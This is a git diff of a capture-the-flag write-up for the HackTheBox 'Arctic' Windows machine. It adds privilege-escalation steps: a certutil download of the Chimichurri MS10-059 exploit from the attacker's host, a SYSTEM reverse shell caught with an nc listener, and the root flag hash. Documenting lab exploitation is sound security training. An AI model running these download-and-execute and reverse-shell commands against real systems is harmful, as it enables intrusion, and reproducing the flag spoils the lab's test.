@@ -4,28 +4,24 @@ title: Arctic HTB Write-Up
 machine_ip: 10.10.10.11
 os: Windows
 difficulty: Easy
-my_rating: 
+my_rating: 4
 tags:
   - Windows
   - PrivEsc
+  - Chimichurri
+  - MS10-059
+  - windows-exploit-suggester
+  - mftp
+  - Coldfusion
+  - nc
+  - certutil
+  - rustscan
 references: "[[📚CTF Box Writeups]]"
----
-# INSTALL ONTO DESKTOP KALI VM ALSO
-==[Rustscan](https://github.com/RustScan/RustScan/wiki/Installation-Guide) ==
-`-a <IP> -t 500 -b 1500 -- -A` 
-`-- -`
-	- `then nmap tacks`
-	- Misses some open ports so also use **nmap**
-
-==feroxbuster==
-- `sudo apt-get install feroxbuster`
-
-
 ---
 
 # Enumeration
 
-- Rustscan
+- Rustscan #rustscan
 ```
 ┌──(root㉿swabby)-[~/Downloads]
 └─# rustscan -a 10.10.10.11 -t 500 -b 1500 -- -sVC
@@ -112,22 +108,15 @@ Nmap done: 1 IP address (1 host up) scanned in 179.91 seconds
            Raw packets sent: 7 (284B) | Rcvd: 7 (324B)
 ```
 
-==- web enum
-	- feroxbuster
-	- gobuster
-	- dirsearch
-	- dirbuster
-	- whatweb
-==
 
-- The Managed File Transfer Protocol (mftp) on port 8500 that is open at `http://10.10.10.11:8500/` shows directories we can browse.
+- The Managed File Transfer Protocol #mftp on port 8500 that is open at `http://10.10.10.11:8500/` shows directories we can browse.
 	- We also found during enumeration `http://10.10.10.11:8500/CFIDE/administrator/` which leads us to a Web Portal for Adobe Cold Fusion 8 Administrator
 	- Upon research, we find that:
 		- "ColdFusion scripts are commonly run as an elevated user, such as NT-Authority\SYSTEM (Windows) or root (Linux), making them especially susceptible to web-based attacks."
 
 # Foothold
 - gain shell via exploit
-- Using `searchsploit`, we find an exploit for Adobe ColdFusion 8 - Remote Command Execution (RCE), `cfm/webapps/50057.py`
+- Using `searchsploit`, we find an exploit for Adobe ColdFusion 8 - Remote Command Execution (RCE), `cfm/webapps/50057.py` #Coldfusion 
 ```
 ┌──(root㉿swabby)-[~/Downloads]
 └─# searchsploit Adobe ColdFusion 8
@@ -204,7 +193,72 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 ```
 
-- Lets try a Potato attack
+- Maybe we can try a Potato attack, lets transfer `JuicyPotato.exe` and run it. This was unsuccessful
+
+- Taking a step back I remember to K.I.S.S. So I run `windows-exploit-suggester.py`
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# ./windows-exploit-suggester.py --database 2024-10-10-mssb.xls --systeminfo Arctic_sysinfo.txt
+[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (utf-8)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 197 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as 'Windows 2008 R2 64-bit'
+[*] 
+[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
+[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
+[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
+[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
+[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
+[*] 
+[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
+[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
+[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
+[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
+[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
+[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+[*] done
+```
+- Check this repo for [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master)
+- After trying checking exploits from bottom to top, we land on MS10-059, download it
+- Transfer the payload to the RHOST
+```
+C:\Users\tolis\Desktop>certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe ms.exe
+certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe ms.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
 ```
 
+- Now, run the exploit from RHOST, specifying the LHOST ip and port. 
+	- Similarly on LHOST, start `nc` listener for same port
+```
+C:\Users\tolis\Desktop>ms.exe 10.10.14.2 5555                                                                                                      
+ms.exe 10.10.14.2 5555                                                                                                                        
+/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>       
+```
+
+- We caught a shell as `NT AUTHORITY/SYSTEM`
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# nc -lnvp 5555 
+listening on [any] 5555 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.11] 49583
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\tolis\Desktop>whoami 
+whoami 
+nt authority\system
+```
+
+- Root flag
+```
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+6faf750c9fca73b7af3441e77749b1c3
 ```
